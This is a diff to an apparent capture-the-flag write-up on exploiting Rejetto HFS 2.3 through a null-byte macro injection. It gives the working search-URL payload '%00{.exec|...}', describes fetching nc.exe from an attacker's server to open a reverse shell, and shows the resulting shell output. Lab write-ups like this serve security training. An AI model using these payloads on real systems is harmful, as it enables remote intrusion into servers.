@@ -32,13 +32,15 @@ function findMacroMarker(s:string; ofs:integer=1):integer;
 begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
 ```
 
-This does not handle null bytes! So we can simply request 
+*"Rejetto HFS versions 2.3, 2.3a, and 2.3b are vulnerable to remote command execution due to a regular expression in parserLib.pas that fails to handle null bytes. Commands that follow a null byte in the search string are executed on the host system.* " (https://www.kb.cert.org/vuls/id/251276)
+
+Such a command must be written in the HFS scripting language format. E.g commands can be executed as follows:
 
 ```
-http://localhost:80/?search=%00{.exec|cmd.}
+http://localhost:80/?search=%00{.exec|<COMMAND HERE>.}
 ```
 
-This will stop the regex from parsing the macro and instead execute the macro.
+This will stop the regex from parsing the macro and instead execute the command.
 
 
 To abuse the vulnerability, I used this script here (might have to execute it several times). You also need to start a http server, from which the script then can download the `nc.exe`, in order to create a reverse shell to your machine.
@@ -82,6 +84,10 @@ C:\Users\kostas\Desktop>whoami
 whoami
 optimum\kostas
 ```
+
+Instead of using this script, the vulnerability can also be manually exploited, by creating a Powershell reverse shell (watch e.g. `Ippsec`: https://www.youtube.com/watch?v=kWTnVBIpNsE).
+
+Also a Metasploit exploit module is available.
 
 
 ## Privilege Escalation
